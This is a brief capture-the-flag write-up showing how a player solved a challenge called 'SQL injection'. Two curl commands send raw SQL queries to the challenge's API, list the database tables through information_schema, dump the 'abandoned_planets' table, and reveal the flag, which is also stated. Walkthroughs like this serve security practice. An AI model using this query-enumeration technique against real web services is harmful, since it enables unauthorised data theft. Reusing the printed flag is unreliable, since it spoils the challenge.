SQL injection

```
┌──(zeqzoq㉿zeqzoq)-[~]
└─$ curl -X POST https://planets.ctf.zone/api.php -H "Content-Type: application/x-www-form-urlencoded" -d "query=SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
[{"TABLE_NAME":"abandoned_planets"},{"TABLE_NAME":"planets"}]
┌──(zeqzoq㉿zeqzoq)-[~]
└─$ curl -X POST https://planets.ctf.zone/api.php -H "Content-Type: application/x-www-form-urlencoded" -d "query=SELECT * FROM abandoned_planets"
[{"id":1,"name":"Pluto","image":"pluto.png","description":"Have you heard about Pluto? That's messed up right? flag{9c4dea2d8ae5681a75f8e670ac8ba999}"}]
```

flag: `flag{9c4dea2d8ae5681a75f8e670ac8ba999}`

Solved by: zeqzoq